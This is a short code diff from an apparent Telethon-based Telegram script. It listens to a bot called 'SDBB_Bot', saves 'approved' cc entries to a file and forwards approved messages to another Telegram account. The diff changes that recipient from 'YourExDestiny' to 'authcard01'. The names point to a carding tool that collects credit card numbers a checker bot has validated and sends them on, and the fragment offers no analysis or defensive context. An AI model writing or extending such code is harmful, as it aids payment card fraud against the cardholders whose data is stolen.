@@ -17,8 +17,8 @@ async def save_approved(cc):
         file.write(cc + '\n')
 
 async def send_approved_to_destiny(message):
-    print(f"Sending approved message to YourExDestiny:\n{message}")
-    await client.send_message('YourExDestiny', message)
+    print(f"Sending approved message to authcard01:\n{message}")
+    await client.send_message('authcard01', message)
     await asyncio.sleep(1)  # Short delay to avoid flooding
 
 @client.on(events.NewMessage(from_users=('SDBB_Bot')))
